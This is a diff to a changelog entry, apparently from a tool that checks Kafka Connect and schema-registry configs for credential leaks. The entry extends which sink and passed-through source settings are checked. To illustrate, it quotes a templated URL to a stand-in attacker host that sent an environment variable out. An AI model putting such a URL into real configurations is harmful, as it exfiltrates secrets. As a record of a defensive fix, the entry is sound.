@@ -271,7 +271,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   settings that move the source's host or credential (`database.hostname`, `database.password`), which
   are judged with the source: the source's password never goes to the Kafka brokers it names for the
   schema history. Kafka Connect's `schema_registry` is judged with the converter settings of the sink
-  config (`value.converter.basic.auth.user.info`), which reach the registry its URL names
+  config and of a passed-through source connection (`value.converter.basic.auth.user.info`), which reach
+  the registry its URL names
   (`https://attacker.example/{{ env.X }}` there sent X to that host). A map written as a list of
   key/value pairs, which a runner merges as it merges a map, is judged as the map it makes.
 - **The SQL gates refuse DuckDB's logging functions and the table functions that run text.**
